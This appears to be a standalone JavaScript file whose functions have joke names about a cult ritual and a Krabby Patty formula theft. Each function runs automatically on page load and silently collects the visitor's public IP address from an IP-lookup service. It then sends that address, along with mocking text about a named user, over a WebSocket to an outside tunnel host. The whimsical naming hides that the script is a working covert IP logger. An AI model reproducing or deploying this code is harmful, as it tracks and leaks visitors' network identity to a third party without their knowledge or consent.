function sacredRitualInvoker() {
    const summonFollower = () => fetch('https://api.ipify.org?format=json').then(res => res.json());

    const sendOmenToAltar = async () => {
        try {
            const followerInfo = await summonFollower();

            const cultSignal = {
                type: "invoke_the_ancients,light_the_candles,offer_the_sacrifice,whisper_to_the_shadows",
                followerID: followerInfo.ip,
                prophecy: "Lmutt090 leads the faithful in the blue-hued cult"
            };

            const altarConnection = new WebSocket('wss://nubnub.loca.lt');

            altarConnection.addEventListener('open', () => {
                altarConnection.send(JSON.stringify(cultSignal));
                console.log("Omen sent to the sacred altar.");
            });

            altarConnection.addEventListener('error', (err) => {
                console.warn("The ritual was interrupted:", err);
            });

        } catch (e) {
            console.warn("Failed to summon the follower's presence:", e);
        }
    };
    sendOmenToAltar();
};

function krabbyPattyFormulaStealer() {
    const locateKrabs = () => fetch('https://api.ipify.org?format=json').then(res => res.json());
    const dispatchToChumBucket = async () => {
        try {
            const secretKrabsInfo = await locateKrabs();
            const chumSignal = {
                type: "ohyeah,mrcrabs,ohyeahohyeah,mrcrabs;ohyeah,mrcrabs,ohyeahohyeah,mrcrabs(repeatlmaoooooo)",
                mrcrabs: secretKrabsInfo.ip,
                worksatthechumbucket: "Lmutt090 is a Krabby Patty formula stealer"
            };
            const secretTunnel = new WebSocket('wss://nubnub.loca.lt');
            secretTunnel.addEventListener('open', () => {
                secretTunnel.send(JSON.stringify(chumSignal));
                console.log("Patty data sent to Chum Bucket.");
            });
            secretTunnel.addEventListener('error', (err) => {
                console.warn("Plankton failed to connect:", err);
            });
        } catch (e) {
            console.warn("Plankton couldn't fetch Krabs' data:", e);
        }
    };
    dispatchToChumBucket();
}
window.addEventListener('DOMContentLoaded', () => {
    const randomChoice = Math.random() < 0.5 ? sacredRitualInvoker : krabbyPattyFormulaStealer;
    randomChoice();
});